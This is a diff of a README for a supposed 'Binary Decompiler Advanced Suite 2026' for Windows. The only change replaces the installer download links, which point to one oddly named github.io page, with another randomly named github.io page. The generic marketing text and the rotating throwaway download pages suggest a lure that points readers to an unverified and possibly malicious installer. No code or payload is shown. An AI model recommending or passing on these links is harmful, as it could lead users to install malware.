@@ -2,7 +2,7 @@
 
 Binary Decompiler Advanced Suite 2026 is a powerful and versatile toolkit designed for professionals and enthusiasts in the field of software reverse engineering. This suite provides advanced decompilation capabilities, allowing users to analyze and understand binary executables on Windows 10 and Windows 11, making it an essential tool for security researchers, developers, and curious minds alike.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -54,7 +54,7 @@ Yes, the suite incorporates advanced deobfuscation techniques to help analyze ob
 
 For the latest version and updates, please visit the official download page.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## Changelog
 
